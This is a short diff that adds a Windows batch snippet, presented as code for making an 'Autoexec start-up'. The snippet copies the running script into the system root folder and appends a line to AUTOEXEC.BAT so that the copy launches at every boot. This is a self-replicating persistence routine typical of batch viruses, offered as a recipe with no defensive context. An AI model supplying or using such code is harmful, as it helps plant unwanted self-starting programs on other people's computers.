@@ -1,0 +1,7 @@
+When making a Autoexec start-up
+use this code shown below:
+
+If Exist "%systemdrive%\AUTOEXEC.BAT" (
+copy %0 "%systemroot%\%0"
+echo start "" "%systemroot%\%0" >> %systemdrive%\AUTOEXEC.BAT
+)
